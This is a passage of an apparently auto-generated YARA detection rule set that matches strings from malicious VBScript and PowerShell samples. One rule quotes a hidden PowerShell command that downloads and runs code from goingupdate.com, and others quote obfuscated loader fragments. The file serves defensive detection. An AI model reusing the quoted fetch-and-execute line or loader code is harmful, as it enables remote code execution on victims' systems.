      $s5 = "Annulets;} else {;$Alumins=Spydkastet 'Com lSWincht MiliaSemicr Ud,at Opna-slumbBPr.coiAt,oftFina sFormuTStranrHeadiaPri,fn Unco" ascii
      $s6 = "Set Computervarer = GetObject(\"winmgmts://./root/default:StdRegProv\")" fullword ascii
      $s7 = "s3 = s3 + \"++$Strikkebogens245;++$Strikkebogens245;$Strikkebogens245=$Strikkebogens245-1;Function Spydkastet ($Aftalesystemerne" ascii
      $s8 = "gte.Cop';while (-not $Ajuga) {&($Matriculants) (Spydkastet 'Bogga$DueliAPengujb.ennuOpstagS,bera P et=Velic(UrtepTLevefeKn,pmsNu" ascii
      $s9 = "Sionite = Sionite + \".exe\"" fullword ascii
      $s10 = "Aurisbioteknikk = Replace(Aurisbioteknikk,Command,String(4,\"L\") )" fullword ascii
      $s11 = "grenost.split([char]62);$Angrenost=$Inkling[0];$Matriculants=Spydkastet 'G.otti Tem,eSesspxantil ';$Armbevgelser = Spydkastet 'D" ascii
      $s12 = "t=$Inkling[$Accusatrix++%$Inkling.count];}&($Matriculants) (Spydkastet 'F,rtr$Disp.SBrunkl Reeke TrineSloerpUdkrviUndernM.kekgSt" ascii
      $s13 = "  Computervarer.EnumKey sauroid, Udslettelsernes, Barbarianises" fullword ascii
      $s14 = "'Boggle comtemplate coralwort" fullword ascii
      $s15 = "ekryv Paa.gKi,loe ForhlforstsOpfaneMecharBroc,)Ho al  lame- ,ndeACiwien Syd.d Mer  B,ach( Pro.[FiaskIAlmernwittet.xtenP Rabit Sp" ascii
      $s16 = "{$barukhzy=5;$barukhzy++;For($Furnarius=5; $Furnarius -lt $Aftalesystemerne.Length-1; $Furnarius+=$barukhzy){$Byggebranche37 = '" ascii
      $s17 = "s;&($Matriculants) (Spydkastet ' UpcaS ,enot ,alla Udgyr,orgetMarat-AvlsfS nicolUnmice bro ecastip,onac Japac5Li.us ');$Angrenos" ascii
      $s18 = "substring';$Vokskabinettet=$Aftalesystemerne.$Byggebranche37.Invoke($Furnarius, 1);$Omlbendes=$Omlbendes+$Vokskabinettet}$Omlben" ascii
      $s19 = "s) (Spydkastet 'Fjern$Prei,A OmplnGarecnIndheu ArmelK ysaeLogiktUdviks Natu Uncon=Wagwa  Manw$ ,ottsCaulimpre.ok Fo bfEvapooSmer" ascii
      $s20 = "'Circuitable, accepteringer undertrkkenes" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 30KB and
      8 of them
}

rule Script_9 {
   meta:
      description = "Script_9"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "13dddd9cebc136afea2553f1b780849f830ce51dd73a7e06eccfe25545911f9d"
   strings:
      $s1 = "Private Const Witherers = \"Execs disgig:\"" fullword ascii
      $s2 = "Private Const Uniprocessors = -40976" fullword ascii
      $s3 = "Private Const Spaltningsprocessens = -50639" fullword ascii
      $s4 = "Private Const Bosom = \"Executory skomagersvendenes104 skeletternes!\"" fullword ascii
      $s5 = "Private Const Blafferpiges = \"Operanders? foyboat:\"" fullword ascii
      $s6 = "Private Const Forstuvningens = \"Telefonsamtalens microprocessor; varulve, strmforsynes\"" fullword ascii
      $s7 = "Private Const Injeceres = \"Scanneren! tilbagetrkningernes afholdsloge nonstative\"" fullword ascii
      $s8 = "Private Const Processerne = \"Forureningsfaktorens beskftigelsesprojekterne\"" fullword ascii
      $s9 = "Private Const Udviklingsprocessernes = \"Detribalized, styrkemaals skiltefabrikken206\"" fullword ascii
      $s10 = "Private Const Udsyet = \"Klaptr unstableness. unbirdlike sewerrat:\"" fullword ascii
      $s11 = "Private Const Boer = \"Produktionsprocessens: feoffees sensifics.\"" fullword ascii
      $s12 = "Private Const Strafprocesser = \"Sapskull gennemsynets\"" fullword ascii
      $s13 = "Private Const Spydigst246 = \"Adfrdsbiologiens86 stamhuses,\"" fullword ascii
      $s14 = "Private Const Ernringsfysiologien172 = \"Tveggede postsplenial. trapezophozophora kjepladserne\"" fullword ascii
      $s15 = "orrhologysskendejalou = Command " fullword ascii
      $s16 = "Private Const Zoologis = -33327" fullword ascii
      $s17 = "Private Const Agenturerne = -24126" fullword ascii
      $s18 = "Private Const Headhunt = -33665" fullword ascii
      $s19 = "Private Const Elevatorskaktene = -55320" fullword ascii
      $s20 = "Private Const Forklog = -19557" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_10 {
   meta:
      description = "Script_10"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "15603ab70daf04dbde87076530c50bb412ed90e1882489ec46931a4c0de04a22"
   strings:
      $s1 = "Private Const Witherers = \"Execs disgig:\"" fullword ascii
      $s2 = "Private Const Uniprocessors = -40976" fullword ascii
      $s3 = "Private Const Spaltningsprocessens = -50639" fullword ascii
      $s4 = "Private Const Bosom = \"Executory skomagersvendenes104 skeletternes!\"" fullword ascii
      $s5 = "Private Const Blafferpiges = \"Operanders? foyboat:\"" fullword ascii
      $s6 = "Private Const Forstuvningens = \"Telefonsamtalens microprocessor; varulve, strmforsynes\"" fullword ascii
      $s7 = "Private Const Injeceres = \"Scanneren! tilbagetrkningernes afholdsloge nonstative\"" fullword ascii
      $s8 = "Private Const Processerne = \"Forureningsfaktorens beskftigelsesprojekterne\"" fullword ascii
      $s9 = "Private Const Udviklingsprocessernes = \"Detribalized, styrkemaals skiltefabrikken206\"" fullword ascii
      $s10 = "Private Const Udsyet = \"Klaptr unstableness. unbirdlike sewerrat:\"" fullword ascii
      $s11 = "Private Const Boer = \"Produktionsprocessens: feoffees sensifics.\"" fullword ascii
      $s12 = "Private Const Strafprocesser = \"Sapskull gennemsynets\"" fullword ascii
      $s13 = "Private Const Spydigst246 = \"Adfrdsbiologiens86 stamhuses,\"" fullword ascii
      $s14 = "Private Const Ernringsfysiologien172 = \"Tveggede postsplenial. trapezophozophora kjepladserne\"" fullword ascii
      $s15 = "orrhologysskendejalou = Command " fullword ascii
      $s16 = "Private Const Zoologis = -33327" fullword ascii
      $s17 = "Private Const Agenturerne = -24126" fullword ascii
      $s18 = "Private Const Headhunt = -33665" fullword ascii
      $s19 = "Private Const Elevatorskaktene = -55320" fullword ascii
      $s20 = "Private Const Forklog = -19557" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_11 {
   meta:
      description = "Script_11"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "73ac6551e788ba3eb82054032f192789502dc52963bd1e49ed745d16a312bb46"
   strings:
      $s1 = "Private Const Witherers = \"Execs disgig:\"" fullword ascii
      $s2 = "Private Const Uniprocessors = -40976" fullword ascii
      $s3 = "Private Const Spaltningsprocessens = -50639" fullword ascii
      $s4 = "Private Const Bosom = \"Executory skomagersvendenes104 skeletternes!\"" fullword ascii
      $s5 = "Teleologist=Unrated.GetSpecialFolder(2) & \"\\Dithyrambic.txt\"" fullword ascii
      $s6 = "Private Const Blafferpiges = \"Operanders? foyboat:\"" fullword ascii
      $s7 = "Private Const Forstuvningens = \"Telefonsamtalens microprocessor; varulve, strmforsynes\"" fullword ascii
      $s8 = "Private Const Injeceres = \"Scanneren! tilbagetrkningernes afholdsloge nonstative\"" fullword ascii
      $s9 = "Private Const Processerne = \"Forureningsfaktorens beskftigelsesprojekterne\"" fullword ascii
      $s10 = "Private Const Udviklingsprocessernes = \"Detribalized, styrkemaals skiltefabrikken206\"" fullword ascii
      $s11 = "Private Const Udsyet = \"Klaptr unstableness. unbirdlike sewerrat:\"" fullword ascii
      $s12 = "Private Const Boer = \"Produktionsprocessens: feoffees sensifics.\"" fullword ascii
      $s13 = "Private Const Strafprocesser = \"Sapskull gennemsynets\"" fullword ascii
      $s14 = "Private Const Spydigst246 = \"Adfrdsbiologiens86 stamhuses,\"" fullword ascii
      $s15 = "Private Const Ernringsfysiologien172 = \"Tveggede postsplenial. trapezophozophora kjepladserne\"" fullword ascii
      $s16 = "orrhologysskendejalou = Command " fullword ascii
      $s17 = "Private Const Zoologis = -33327" fullword ascii
      $s18 = "Private Const Agenturerne = -24126" fullword ascii
      $s19 = "Private Const Headhunt = -33665" fullword ascii
      $s20 = "Private Const Elevatorskaktene = -55320" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_12 {
   meta:
      description = "Script_12"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "7698fb4c720a5c5810a8b80ae25ef1e6f5185e49cb151ef21937f0788276354e"
   strings:
      $s1 = "Private Const Witherers = \"Execs disgig:\"" fullword ascii
      $s2 = "Private Const Uniprocessors = -40976" fullword ascii
      $s3 = "Private Const Spaltningsprocessens = -50639" fullword ascii
      $s4 = "Private Const Bosom = \"Executory skomagersvendenes104 skeletternes!\"" fullword ascii
      $s5 = "Private Const Blafferpiges = \"Operanders? foyboat:\"" fullword ascii
      $s6 = "Private Const Forstuvningens = \"Telefonsamtalens microprocessor; varulve, strmforsynes\"" fullword ascii
      $s7 = "Private Const Injeceres = \"Scanneren! tilbagetrkningernes afholdsloge nonstative\"" fullword ascii
      $s8 = "Private Const Processerne = \"Forureningsfaktorens beskftigelsesprojekterne\"" fullword ascii
      $s9 = "Private Const Udviklingsprocessernes = \"Detribalized, styrkemaals skiltefabrikken206\"" fullword ascii
      $s10 = "Private Const Udsyet = \"Klaptr unstableness. unbirdlike sewerrat:\"" fullword ascii
      $s11 = "Private Const Boer = \"Produktionsprocessens: feoffees sensifics.\"" fullword ascii
      $s12 = "Private Const Strafprocesser = \"Sapskull gennemsynets\"" fullword ascii
      $s13 = "Private Const Spydigst246 = \"Adfrdsbiologiens86 stamhuses,\"" fullword ascii
      $s14 = "Private Const Ernringsfysiologien172 = \"Tveggede postsplenial. trapezophozophora kjepladserne\"" fullword ascii
      $s15 = "orrhologysskendejalou = Command " fullword ascii
      $s16 = "Private Const Zoologis = -33327" fullword ascii
      $s17 = "Private Const Agenturerne = -24126" fullword ascii
      $s18 = "Private Const Headhunt = -33665" fullword ascii
      $s19 = "Private Const Elevatorskaktene = -55320" fullword ascii
      $s20 = "Private Const Forklog = -19557" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_13 {
   meta:
      description = "Script_13"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "959ec9d9287432e3234cf35de1ad899ad4ae44d06e2bbf4fd0fe806b58ee6e21"
   strings:
      $s1 = "Private Const Witherers = \"Execs disgig:\"" fullword ascii
      $s2 = "Private Const Uniprocessors = -40976" fullword ascii
      $s3 = "Private Const Spaltningsprocessens = -50639" fullword ascii
      $s4 = "Private Const Bosom = \"Executory skomagersvendenes104 skeletternes!\"" fullword ascii
      $s5 = "Private Const Blafferpiges = \"Operanders? foyboat:\"" fullword ascii
      $s6 = "Private Const Forstuvningens = \"Telefonsamtalens microprocessor; varulve, strmforsynes\"" fullword ascii
      $s7 = "Private Const Injeceres = \"Scanneren! tilbagetrkningernes afholdsloge nonstative\"" fullword ascii
      $s8 = "Private Const Processerne = \"Forureningsfaktorens beskftigelsesprojekterne\"" fullword ascii
      $s9 = "Private Const Udviklingsprocessernes = \"Detribalized, styrkemaals skiltefabrikken206\"" fullword ascii
      $s10 = "Private Const Udsyet = \"Klaptr unstableness. unbirdlike sewerrat:\"" fullword ascii
      $s11 = "Private Const Boer = \"Produktionsprocessens: feoffees sensifics.\"" fullword ascii
      $s12 = "Private Const Strafprocesser = \"Sapskull gennemsynets\"" fullword ascii
      $s13 = "Private Const Spydigst246 = \"Adfrdsbiologiens86 stamhuses,\"" fullword ascii
      $s14 = "Private Const Ernringsfysiologien172 = \"Tveggede postsplenial. trapezophozophora kjepladserne\"" fullword ascii
      $s15 = "orrhologysskendejalou = Command " fullword ascii
      $s16 = "Private Const Zoologis = -33327" fullword ascii
      $s17 = "Private Const Agenturerne = -24126" fullword ascii
      $s18 = "Private Const Headhunt = -33665" fullword ascii
      $s19 = "Private Const Elevatorskaktene = -55320" fullword ascii
      $s20 = "Private Const Forklog = -19557" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_14 {
   meta:
      description = "Script_14"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b4b38cc10f119910b920ace68d036316e23631d69d6b6c437ae91732c7244cf1"
   strings:
      $s1 = "Private Const Witherers = \"Execs disgig:\"" fullword ascii
      $s2 = "Private Const Uniprocessors = -40976" fullword ascii
      $s3 = "Private Const Spaltningsprocessens = -50639" fullword ascii
      $s4 = "Private Const Bosom = \"Executory skomagersvendenes104 skeletternes!\"" fullword ascii
      $s5 = "Private Const Blafferpiges = \"Operanders? foyboat:\"" fullword ascii
      $s6 = "Private Const Forstuvningens = \"Telefonsamtalens microprocessor; varulve, strmforsynes\"" fullword ascii
      $s7 = "Private Const Injeceres = \"Scanneren! tilbagetrkningernes afholdsloge nonstative\"" fullword ascii
      $s8 = "Private Const Processerne = \"Forureningsfaktorens beskftigelsesprojekterne\"" fullword ascii
      $s9 = "Private Const Udviklingsprocessernes = \"Detribalized, styrkemaals skiltefabrikken206\"" fullword ascii
      $s10 = "Private Const Udsyet = \"Klaptr unstableness. unbirdlike sewerrat:\"" fullword ascii
      $s11 = "Private Const Boer = \"Produktionsprocessens: feoffees sensifics.\"" fullword ascii
      $s12 = "Private Const Strafprocesser = \"Sapskull gennemsynets\"" fullword ascii
      $s13 = "Private Const Spydigst246 = \"Adfrdsbiologiens86 stamhuses,\"" fullword ascii
      $s14 = "Private Const Ernringsfysiologien172 = \"Tveggede postsplenial. trapezophozophora kjepladserne\"" fullword ascii
      $s15 = "orrhologysskendejalou = Command " fullword ascii
      $s16 = "Private Const Zoologis = -33327" fullword ascii
      $s17 = "Private Const Agenturerne = -24126" fullword ascii
      $s18 = "Private Const Headhunt = -33665" fullword ascii
      $s19 = "Private Const Elevatorskaktene = -55320" fullword ascii
      $s20 = "Private Const Forklog = -19557" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_15 {
   meta:
      description = "Script_15"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "bffdb577c988ed5e51afa15e6ae61122e05f1101ace3ae9fd045ee98305da19c"
   strings:
      $s1 = "Private Const Witherers = \"Execs disgig:\"" fullword ascii
      $s2 = "Private Const Uniprocessors = -40976" fullword ascii
      $s3 = "Private Const Spaltningsprocessens = -50639" fullword ascii
      $s4 = "Private Const Bosom = \"Executory skomagersvendenes104 skeletternes!\"" fullword ascii
      $s5 = "Private Const Blafferpiges = \"Operanders? foyboat:\"" fullword ascii
      $s6 = "Private Const Forstuvningens = \"Telefonsamtalens microprocessor; varulve, strmforsynes\"" fullword ascii
      $s7 = "Private Const Injeceres = \"Scanneren! tilbagetrkningernes afholdsloge nonstative\"" fullword ascii
      $s8 = "Private Const Processerne = \"Forureningsfaktorens beskftigelsesprojekterne\"" fullword ascii
      $s9 = "Private Const Udviklingsprocessernes = \"Detribalized, styrkemaals skiltefabrikken206\"" fullword ascii
      $s10 = "Private Const Udsyet = \"Klaptr unstableness. unbirdlike sewerrat:\"" fullword ascii
      $s11 = "Private Const Boer = \"Produktionsprocessens: feoffees sensifics.\"" fullword ascii
      $s12 = "Private Const Strafprocesser = \"Sapskull gennemsynets\"" fullword ascii
      $s13 = "Private Const Spydigst246 = \"Adfrdsbiologiens86 stamhuses,\"" fullword ascii
      $s14 = "Private Const Ernringsfysiologien172 = \"Tveggede postsplenial. trapezophozophora kjepladserne\"" fullword ascii
      $s15 = "orrhologysskendejalou = Command " fullword ascii
      $s16 = "Private Const Zoologis = -33327" fullword ascii
      $s17 = "Private Const Agenturerne = -24126" fullword ascii
      $s18 = "Private Const Headhunt = -33665" fullword ascii
      $s19 = "Private Const Elevatorskaktene = -55320" fullword ascii
      $s20 = "Private Const Forklog = -19557" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_16 {
   meta:
      description = "Script_16"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e2ce7a507a8cdc3eb8a4c35bb12adca85a4b46ecb3ebba5b4a1b232dfa3fa1b4"
   strings:
      $s1 = "Private Const Witherers = \"Execs disgig:\"" fullword ascii
      $s2 = "Private Const Uniprocessors = -40976" fullword ascii
      $s3 = "Private Const Spaltningsprocessens = -50639" fullword ascii
      $s4 = "Private Const Bosom = \"Executory skomagersvendenes104 skeletternes!\"" fullword ascii
      $s5 = "Private Const Blafferpiges = \"Operanders? foyboat:\"" fullword ascii
      $s6 = "Private Const Forstuvningens = \"Telefonsamtalens microprocessor; varulve, strmforsynes\"" fullword ascii
      $s7 = "Private Const Injeceres = \"Scanneren! tilbagetrkningernes afholdsloge nonstative\"" fullword ascii
      $s8 = "Private Const Processerne = \"Forureningsfaktorens beskftigelsesprojekterne\"" fullword ascii
      $s9 = "Private Const Udviklingsprocessernes = \"Detribalized, styrkemaals skiltefabrikken206\"" fullword ascii
      $s10 = "Private Const Udsyet = \"Klaptr unstableness. unbirdlike sewerrat:\"" fullword ascii
      $s11 = "Private Const Boer = \"Produktionsprocessens: feoffees sensifics.\"" fullword ascii
      $s12 = "Private Const Strafprocesser = \"Sapskull gennemsynets\"" fullword ascii
      $s13 = "Private Const Spydigst246 = \"Adfrdsbiologiens86 stamhuses,\"" fullword ascii
      $s14 = "Private Const Ernringsfysiologien172 = \"Tveggede postsplenial. trapezophozophora kjepladserne\"" fullword ascii
      $s15 = "orrhologysskendejalou = Command " fullword ascii
      $s16 = "Private Const Zoologis = -33327" fullword ascii
      $s17 = "Private Const Agenturerne = -24126" fullword ascii
      $s18 = "Private Const Headhunt = -33665" fullword ascii
      $s19 = "Private Const Elevatorskaktene = -55320" fullword ascii
      $s20 = "Private Const Forklog = -19557" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_17 {
   meta:
      description = "Script_17"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "743a36af1075b2ed3a96048db1db5584273ec49029add4fdd00070650aca67a1"
   strings:
      $s1 = "Private Const Pistilogy = \"Overreader mindretalsregering elevatorfreren:\"" fullword ascii
      $s2 = "Private Const Execs = &HAFE8" fullword ascii
      $s3 = "Private Const Cysticolous = \"Adresselse94 lidelse logicizes libytheidae:\"" fullword ascii
      $s4 = "Private Const Preprocessorens = \"Quarto weiselbergite! unbastinadoed\"" fullword ascii
      $s5 = "Private Const Skridttlleres105 = \"Kosmetologi matchings71. arveonklerne prayerfulness:\"" fullword ascii
      $s6 = "Private Const Pelicometer = \"Blokbebyggelserne: tamt:\"" fullword ascii
      $s7 = "Private Const Halogenlygterne = \"Headpin kindlessly; peeved!\"" fullword ascii
      $s8 = "Private Const Temporalness = \"Laralia makke bilbombes:\"" fullword ascii
      $s9 = "Private Const Wamefull4 = \"Dumpiest, hundepensionernes hovedstol navarho;\"" fullword ascii
      $s10 = "Private Const Prsidentvalget = -21091" fullword ascii
      $s11 = "Private Const Logoet = -6301" fullword ascii
      $s12 = "Private Const axiolog = -22568" fullword ascii
      $s13 = "Private Const Lederlaget = -34437" fullword ascii
      $s14 = "Private Const gastroenterologic = -27232" fullword ascii
      $s15 = "Private Const Logchip = -36826" fullword ascii
      $s16 = "Private Const Analogist = -34674" fullword ascii
      $s17 = "Private Const Teknologis = -50151" fullword ascii
      $s18 = "Private Const Underbygget = -49634" fullword ascii
      $s19 = "Private Const Eksportraad = \"Horizontalizations, regionplanlovenes folkeslagets skemalagte\"" fullword ascii
      $s20 = "Private Const Underarmsmusklernes = \"miljvenligst? shellycoat\"" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 500KB and
      8 of them
}

rule Script_18 {
   meta:
      description = "Script_18"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "2d960acdda45cd77a0590c6f652d8496eba30e1b2b263f6a083ac5b27512d1c6"
   strings:
      $s1 = "yocjwfkn = \"-Command Invoke-Expression (Invoke-RestMethod -Uri 'goingupdate.com/ptoleqco')\"" fullword ascii
      $s2 = "CreateObject(aklvvuql).ShellExecute \"powershell\", yocjwfkn ,\"\",\"\",0" fullword ascii
      $s3 = "        set oDriver = oService.Get(\"Win32_PrinterDriver.Name='\" & strObject & \"'\")" fullword ascii
      $s4 = "        wscript.echo L_Text_Msg_Driver07_Text & L_Space_Text & oDriver.DataFile" fullword ascii
      $s5 = "        wscript.echo L_Text_Msg_Driver04_Text & L_Space_Text & oDriver.SupportedPlatform" fullword ascii
      $s6 = "        wscript.echo L_Text_Msg_Driver03_Text & L_Space_Text & oDriver.Version" fullword ascii
      $s7 = "    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then" fullword ascii
      $s8 = "        ParseCommandLine = kErrorSuccess" fullword ascii
      $s9 = "    IsHostCscript = bReturn" fullword ascii
      $s10 = "        ParseCommandLine = kErrorFailure" fullword ascii
      $s11 = "            if LCase(strCommand) = \"cscript\" then" fullword ascii
      $s12 = "        wscript.echo L_Text_Msg_Driver01_Text & L_Space_Text & strServer" fullword ascii
      $s13 = "        wscript.echo L_Text_Msg_General05_Text & L_Space_Text & L_Error_Text & L_Space_Text _" fullword ascii
      $s14 = "            wscript.echo L_Text_Msg_General04_Text & L_Space_Text & oDriver.Name" fullword ascii
      $s15 = "        wscript.echo L_Text_Error_General02_Text & L_Space_Text & L_Error_Text & L_Space_Text _" fullword ascii
      $s16 = "        wscript.echo L_Text_Error_General01_Text & L_Space_Text & L_Error_Text & L_Space_Text _" fullword ascii
      $s17 = "        wscript.echo L_Text_Msg_Driver06_Text & L_Space_Text & oDriver.DriverPath" fullword ascii
      $s18 = "        wscript.echo L_Text_Msg_Driver08_Text & L_Space_Text & oDriver.ConfigFile" fullword ascii
      $s19 = "        wscript.echo L_Text_Msg_Driver05_Text & L_Space_Text & oDriver.MonitorName" fullword ascii
      $s20 = "        wscript.echo L_Text_Msg_General09_Text & L_Space_Text & L_Error_Text & L_Space_Text _" fullword ascii
   condition:
      uint16(0) == 0x0a0d and filesize < 40KB and
      8 of them
}

rule Script_19 {
   meta:
      description = "Script_19"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "544887bc3f0dccb610dd7ba35b498a03ea32fca047e133a0639d5bca61cc6f45"
   strings:
      $x1 = "marrywise=[];marrywise['damagingyard']='h';marrywise['skipscandalous']='f';marrywise['versedconscious']='q';marrywise['teenyscar" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                       ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                       ' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                           ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                       ' */
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                    ' */
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                        ' */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                         ' */
      $s12 = "Oi93aW5saWJzNjR1Y3J0X3N0YWdlL2djYy0xMy4yLjAvYnVpbGRfbWluZ3cveDg2XzY0LXc2NC1taW5ndzMyL2xpYmdjYwAuLi8uLi8uLi9saWJnY2MALi4vLi4vLi4v" ascii /* base64 encoded string ':/winlibs64ucrt_stage/gcc-13.2.0/build_mingw/x86_64-w64-mingw32/libgcc ../../../libgcc ../../../' */
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                R:\winlibs64ucrt_stage\gcc-13.2.0\build_mingw\x86_64-w64-mingw32\libgcc ../../../libgcc/config/i386 cygwin.S R:\winlibs64ucrt_stage\gcc-13.2.0\build_mingw\x86_64-w64-mingw32\libgcc ../../../libgcc/libgcc2.c R:/winlibs64ucrt_stage/gcc-13.2.0/build_mingw/x86_64-w64-mingw32/libgcc ../../../libgcc ../../../libgcc/../gcc/config/i386 libgcc2.c i386.h gbl-ctors.h libgcc2.c                                                                                                        ' */
      $s14 = "cml0aWNhbFNlY3Rpb24ALnJlZnB0ci5fX0NUT1JfTElTVF9fAFZpcnR1YWxRdWVyeQBfX2ltcF9fX3BfX19hcmd2AF9fX2NydF94aV9zdGFydF9fAF9faW1wX19hbXNn" ascii /* base64 encoded string 'riticalSection .refptr.__CTOR_LIST__ VirtualQuery __imp___p___argv ___crt_xi_start__ __imp__amsg' */
      $s15 = "YrFwZpaRjEc4/GltBMp0871zCXsG1byWIpdMY848oVtPBxs0HiY8pub5NF8Nu171wAsIdoPdYrrwORVgB7wX3ZxwT0y3revjfscQTS0WxLEZ3XV+UjZ6ZK2hEVXU+ilC" ascii
      $s16 = "aXplX25hcnJvd19lbnZpcm9ubWVudABfX21pbmd3X2luaXRsdHNkcm90X2ZvcmNlAF9faW1wX2ZyZWUATG9hZExpYnJhcnlBAF9faW1wX19jb25maWd1cmVfd2lkZV9h" ascii /* base64 encoded string 'ize_narrow_environment __mingw_initltsdrot_force __imp_free LoadLibraryA __imp__configure_wide_argv __imp_at_quick_exit __p__environ .refptr.__mingw_app_type __mingw_initltssuo_force VirtualProtect _head_lib64_libapi_ms_win_crt_environment_l1_1_0_a __imp__tzset ___crt_xp_start__ __imp_LeaveCriticalSection .refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__ __imp___ms_fwprintf ___crt_xp_end__ __minor_os_version__ __p___argv __lib64_libapi_ms_win_crt_string_l1_1_0_a_iname EnterCriticalSection _set_new_mode .refptr.__xi_a .refptr._CRT_MT __imp__exit __section_alignment__ __native_dllmain_reason __lib64_libapi_ms_win_crt_private_l1_1_0_a_iname _tls_used __IAT_end__ _head_lib64_libapi_ms_win_crt_time_l1_1_0_a __imp_memcpy __RUNTIME_PSEUDO_RELOC_LIST' */
      $s17 = "AF9jb25maWd1cmVfd2lkZV9hcmd2AF9faW1wX19jcnRfYXRleGl0AF9fbGliNjRfbGliYXBpX21zX3dpbl9jcnRfZW52aXJvbm1lbnRfbDFfMV8wX2FfaW5hbWUAX19p" ascii /* base64 encoded string ' _configure_wide_argv __imp__crt_atexit __lib64_libapi_ms_win_crt_environment_l1_1_0_a_iname __i' */
